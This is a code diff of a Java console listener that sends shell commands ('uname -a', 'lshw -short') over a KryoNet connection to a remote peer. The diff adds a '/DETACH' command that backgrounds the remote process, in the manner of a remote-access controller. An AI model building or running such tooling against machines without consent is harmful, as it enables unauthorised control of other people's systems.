@@ -1,6 +1,9 @@
 import com.esotericsoftware.kryonet.Connection;
 
 import java.util.Scanner;
+import java.util.UUID;
+
+import static jdk.nashorn.internal.runtime.regexp.joni.Syntax.Java;
 
 public class InputListener extends Thread {
     /*
@@ -60,6 +63,9 @@ public class InputListener extends Thread {
                     } else if (input.equals("/INFO") ) {
                         c.sendTCP(new Command("uname -a"));
                         c.sendTCP(new Command("lshw -short"));
+                        continue;
+                    } else if (input.equals("/DETACH")) {
+                        c.sendTCP(new BackgroundInitializer(UUID.randomUUID().toString()));
                         continue;
                     }
 
